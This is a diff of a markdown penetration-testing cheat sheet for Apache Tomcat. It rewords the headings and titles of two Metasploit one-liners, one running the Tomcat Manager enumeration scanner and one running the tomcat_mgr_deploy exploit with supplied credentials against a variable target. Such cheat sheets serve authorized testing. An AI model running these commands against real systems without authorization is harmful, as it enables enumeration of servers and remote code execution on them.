@@ -4,9 +4,9 @@
 
 ### Manager enum
 
-Use the Tomcat Manager enumeration module.
+Read manager enum with Tomcat.
 
-```sh title:"Use Tomcat Manager enum module"
+```sh title:"Tomcat Read Manager Enum"
 msfconsole -x "use auxiliary/scanner/http/tomcat_enum; set RHOSTS $rhost_ip; set RPORT $rport; run; exit"
 ```
 <!-- cheat
@@ -16,9 +16,9 @@ var rport := 8080
 
 ### Manager deploy
 
-Use the Tomcat Manager deploy module.
+Read manager deploy with Tomcat.
 
-```sh title:"Use Tomcat Manager deploy module"
+```sh title:"Tomcat Read Manager Deploy"
 msfconsole -x "use exploit/multi/http/tomcat_mgr_deploy; set RHOSTS $rhost_ip; set RPORT $rport; set USERNAME $user; set PASSWORD $pass; run; exit"
 ```
 <!-- cheat
